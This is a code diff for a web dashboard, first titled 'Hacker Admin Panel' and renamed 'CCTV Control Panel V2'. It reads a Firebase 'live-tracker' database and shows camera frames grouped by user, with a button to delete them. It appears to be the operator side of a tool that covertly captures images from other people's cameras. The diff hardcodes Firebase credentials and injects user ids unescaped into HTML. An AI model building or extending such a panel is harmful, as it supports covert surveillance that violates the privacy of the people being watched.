@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hacker Admin Panel</title>
+<title>CCTV Control Panel V2</title>
 
 <style>
 body{
@@ -19,13 +19,14 @@ header{
   text-align:center;
   font-size:18px;
   border-bottom:1px solid #00ff9d33;
+  letter-spacing:2px;
 }
 
-/* MAIN GRID */
+/* USERS GRID */
 .container{
   display:flex;
   flex-direction:column;
-  gap:15px;
+  gap:20px;
   padding:15px;
 }
 
@@ -35,52 +36,68 @@ header{
   border-radius:12px;
   padding:12px;
   background:#0b0f1a;
-  box-shadow:0 0 10px #00ff9d22;
+  box-shadow:0 0 12px #00ff9d22;
 }
 
-/* TIMELINE */
-.timeline{
-  margin-top:10px;
-  max-height:420px;
-  overflow-y:auto;
+/* TOP BAR */
+.topBar{
   display:flex;
-  flex-direction:column;
+  justify-content:space-between;
+  align-items:center;
+}
+
+/* BUTTONS */
+button{
+  padding:6px 10px;
+  border:1px solid #00ff9d55;
+  background:transparent;
+  color:#00ff9d;
+  cursor:pointer;
+  border-radius:6px;
+  font-size:12px;
+}
+button:hover{
+  box-shadow:0 0 10px #00ff9d55;
+}
+
+/* GRID (COLUMNS) */
+.grid{
+  margin-top:10px;
+  display:grid;
+  grid-template-columns:repeat(4, 1fr);
   gap:10px;
+  max-height:450px;
+  overflow-y:auto;
   padding-right:5px;
 }
 
-/* IMAGE STYLE */
-.timeline img{
+/* RESPONSIVE */
+@media(max-width:900px){
+  .grid{grid-template-columns:repeat(3, 1fr);}
+}
+@media(max-width:600px){
+  .grid{grid-template-columns:repeat(2, 1fr);}
+}
+
+/* IMAGE */
+.grid img{
   width:100%;
+  height:120px;
+  object-fit:cover;
   border-radius:8px;
   border:1px solid #00ff9d33;
   transition:0.2s;
 }
 
-.timeline img:hover{
-  transform:scale(1.02);
-}
-
-/* BUTTON */
-button{
-  margin-top:8px;
-  padding:8px 12px;
-  background:transparent;
-  border:1px solid #00ff9d55;
-  color:#00ff9d;
-  cursor:pointer;
-  border-radius:8px;
-}
-
-button:hover{
-  box-shadow:0 0 10px #00ff9d55;
+.grid img:hover{
+  transform:scale(1.05);
 }
 </style>
 </head>
 
 <body>
 
-<header>💀 LIVE HACKER ADMIN PANEL</header>
+<header>💀 CCTV CONTROL PANEL V2</header>
 
 <div class="container" id="grid"></div>
 
@@ -90,7 +107,7 @@ button:hover{
 <script>
 
 const firebaseConfig = {
-  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57O8ALtSkfNdMmrE",
+  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
   authDomain: "live-tracker-554a7.firebaseapp.com",
   databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
   projectId: "live-tracker-554a7",
@@ -102,16 +119,16 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-const grid = document.getElementById("grid");
+const container = document.getElementById("grid");
 
 /* LOAD USERS */
 db.ref("camera").on("value",(snap)=>{
 
   const data = snap.val();
-  grid.innerHTML="";
+  container.innerHTML="";
 
   if(!data){
-    grid.innerHTML="<p>No Users Found</p>";
+    container.innerHTML="<p>No Data Found</p>";
     return;
   }
 
@@ -121,27 +138,26 @@ db.ref("camera").on("value",(snap)=>{
     box.className="userBox";
 
     box.innerHTML=`
-      <h3>👤 ${userId}</h3>
+      <div class="topBar">
+        <h3>👤 ${userId}</h3>
+        <button onclick="deleteUser('${userId}')">DELETE ALL</button>
+      </div>
 
-      <button onclick="deleteUser('${userId}')">
-        🗑 DELETE ALL
-      </button>
-
-      <div class="timeline" id="list_${userId}">
+      <div class="grid" id="list_${userId}">
         loading...
       </div>
     `;
 
-    grid.appendChild(box);
+    container.appendChild(box);
 
-    loadTimeline(userId);
+    loadImages(userId);
 
   });
 
 });
 
-/* LOAD TIMELINE */
-function loadTimeline(userId){
+/* LOAD IMAGES GRID */
+function loadImages(userId){
 
   const ref=db.ref("camera/"+userId);
 
@@ -153,7 +169,7 @@ function loadTimeline(userId){
     box.innerHTML="";
 
     if(!data){
-      box.innerHTML="<p>No images</p>";
+      box.innerHTML="<p>No Images</p>";
       return;
     }
 
@@ -164,7 +180,7 @@ function loadTimeline(userId){
       img.src=item.frame || "";
 
       img.onerror=()=>{
-        img.src="https://via.placeholder.com/400x300?text=Error";
+        img.src="https://via.placeholder.com/300x200?text=Error";
       };
 
       box.appendChild(img);
